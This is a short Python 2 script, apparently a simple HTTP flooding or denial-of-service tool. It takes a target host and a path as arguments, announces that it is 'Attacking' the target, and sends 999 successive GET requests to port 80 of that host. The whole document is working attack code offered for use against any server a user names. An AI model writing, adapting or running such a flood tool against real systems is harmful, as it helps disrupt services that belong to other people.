import socket, sys, os  
print "][ Attacking " + sys.argv[1]  + " ... ]["  
print "injecting " + sys.argv[2];  
def attack():  
    #pid = os.fork()  
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    s.connect((sys.argv[1], 80))  
    print ">> GET /" + sys.argv[2] + " HTTP/1.1"  
    s.send("GET /" + sys.argv[2] + " HTTP/1.1\r\n")  
    s.send("Host: " + sys.argv[1]  + "\r\n\r\n");  
    s.close()  
for i in range(1, 1000):  
    attack()  